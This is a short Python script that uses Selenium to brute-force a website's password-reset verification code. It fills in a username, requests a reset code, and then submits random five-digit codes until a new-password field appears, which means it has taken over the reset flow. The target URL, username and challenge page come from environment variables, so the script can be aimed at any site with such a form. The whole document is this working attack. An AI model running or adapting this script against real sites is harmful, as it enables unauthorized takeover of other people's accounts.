from selenium import webdriver
from selenium.webdriver.common.by import By
import time, os
import random

from dotenv import load_dotenv

load_dotenv()


url = os.getenv('URL')
print(url)
username = os.getenv('USERNAME')
challenge_url = os.getenv('CHALLENGE_URL')

# For the sake of an example i suppose that the reset codes of the webiste are just 5 digit numbers and they can't have a leading zero 
verificationCodes = ['%05d' % i for i in range(10000,100000)]

browser = webdriver.Chrome()
browser.get(url)
userId = browser.find_element(By.ID,'cnic')
userId.send_keys(username)
sendCodeButton = browser.find_element(By.NAME,'submit')
sendCodeButton.click()
time.sleep(3)
foundCode = False

# skip verification method option
sendCodeButton = browser.find_element(By.NAME, 'submit')
sendCodeButton.click()
while not foundCode:
    try:
        random.shuffle(verificationCodes)
        code = verificationCodes[-1]
        #code = input('Enter code:')
        print('Trying', code)
        emailCode = browser.find_element(By.ID, 'code')
        emailCode.clear()
        emailCode.send_keys(code)
        verifyCodeButton = browser.find_element(By.NAME, 'cnic')
        verifyCodeButton.click()
        #time.sleep(3)
        try:
            browser.find_element(By.ID, 'password1')
            print('Found code', code)
            foundCode = True
        except:
            verificationCodes.pop()
            print('%d codes left' % len(verificationCodes))
            pass
    except Exception as e:
        print(e)
        time.sleep(5)
    finally:
        browser.get(challenge_url)

input('enter new password')
input('enter new password')
input('enter new password')
